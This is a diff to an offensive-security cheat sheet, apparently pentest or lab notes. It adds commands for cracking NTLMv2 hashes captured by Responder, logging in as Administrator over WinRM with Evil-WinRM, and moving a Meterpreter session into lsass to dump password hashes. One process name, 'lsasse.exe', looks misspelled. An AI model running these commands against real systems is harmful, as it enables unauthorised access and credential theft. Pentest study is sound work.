@@ -30,4 +30,14 @@ Crack Hashes from responder:
     hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   
     
 ### Evil-WinRM
-Access port 5985. Use with a username / password or username / hash. $ evil-winrm -u Administrator -p password -i 10.10.10.10    
+Access port 5985. Use with a username / password or username / hash. 
+
+    $ evil-winrm -u Administrator -p password -i 10.10.10.10    
+
+
+### Metasploit and Meterpreter   
+Meterpreter shell: need to migrate to lsass process to dump hashes, due to process permissions on Windows.         
+    
+    meter > migrate -N lsasse.exe       
+    meter > hashdump     
+    
